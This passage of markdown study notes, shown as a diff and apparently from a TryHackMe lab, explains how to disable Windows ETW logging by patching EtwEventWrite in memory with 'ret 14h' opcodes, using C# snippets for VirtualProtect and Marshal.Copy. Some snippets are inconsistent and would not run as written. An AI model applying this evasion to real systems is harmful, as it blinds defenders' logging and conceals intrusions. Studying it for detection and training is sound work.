@@ -122,12 +122,93 @@ Tryhackme\administrator
 PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
 18
 ````
+## Patching Tracing Function
+- ETW is loaded from the runtime of every new process, commonly originating from the CLR (Common Language Runtime). 
+- Within a new process, ETW events are sent from the userland and issued directly from the current process. 
+- An attacker can write pre-defined opcodes to an in-memory function of ETW to patch and disable functionality.
+- High Level POC
+````
+int x = 1
+int y = 3
+return x + y
 
+// output: 4  
+-------------------------
+int x = 1
+return  x
+int y = 3
+return x + y
 
+// output: 1  
+````
+-  We know that from the CLR, ETW is written from the function `EtwEventWrite`. To identify “patch points” or returns, we can view the disassembly of the function.
+````
+779f2459 33cc		       xor	ecx, esp
+779f245b e8501a0100	   call	ntdll!_security_check_cookie
+779f2460 8be5		       mov	esp, ebp
+779f2462 5d		         pop	ebp
+779f2463 c21400		     ret	14h 
+````
+- `ret 14h` will end the function and return to the previous application.
+- The parameter of ret (`14h`) will specify the number of bytes or words released once the stack is popped.
+- To neuter the function, an attacker can write the opcode bytes of `ret14h, c21400` to memory to patch the function.
+![52fd846d5fa1e76948ac47d563ad6228](https://user-images.githubusercontent.com/75596877/172450790-cb56c592-7cc1-4dba-ad31-9bec8a76b615.png)
+- At a high level, ETW patching can be broken up into five steps:
+### Steps for ETW
+- Obtain a handle for `EtwEventWrite`
+- Modify memory permissions of the function
+- Write opcode bytes to memory
+- Reset memory permissions of the function (optional)
+- Flush the instruction cache (optional)
+- At step one, we need to obtain a handle for the address of `EtwEventWrite`. This function is stored within `ntdll`. We will first load the library using `LoadLibrary` then obtain the handle using `GetProcAddress`.
+````
+var ntdll = Win32.LoadLibrary("ntdll.dll");
+var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
+````
+- At step two, we need to modify the memory permissions of the function to allow us to write to the function. The permission of the function is defined by the `flNewProtect` parameter; `0x40` enables X, R, or RW access (memory protection constraints).
+````
+uint oldProtect;
+Win32.VirtualProtect(
+	etwFunction, 
+	(UIntPtr)patch.Length, 
+	0x40, 
+	out oldProtect
+);
+````
+- At step three, the function has the permissions we need to write to it, and we have the pre-defined opcode to patch it. 
+- Because we are writing to a function and not a process, we can use the infamous `Marshal.Copy` to write our opcode.
+````
+patch(new byte[] { 0xc2, 0x14, 0x00 });
+Marshal.Copy(
+	patch, 
+	0, 
+	etwEventSend, 
+	patch.Length
+);
+````
+- At step four, we can begin cleaning our steps to restore memory permissions as they were.
+````
+VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);
+At step five, we can ensure the patched function will be executed from the instruction cache.
 
+Win32.FlushInstructionCache(
+	etwFunction,
+	NULL
+);
+````
+- We can compile these steps together and append them to a malicious script or session. Use the C# script provided and experiment with this technique.
 
+- After the opcode is written to memory, we can view the disassembled function again to observe the patch.
+````
+779f23c0 c21400		    ret	14h
+779f23c3 00ec		      add	ah, ch
+779f23c5 83e4f8		    and	esp, 0FFFFFFF8h
+779f23c8 81ece0000000	sub	esp, 0E0h
+````
+- In the above disassembly, we see exactly what we depicted in our LIFO diagram (figure 2).
 
+- Once the function is patched in memory, it will always return when `EtwEventWrite` is called.
 
-
+- Although this is a beautifully crafted technique, it might not be the best approach depending on your environment since it may restrict more logs than you want for integrity.
 
 
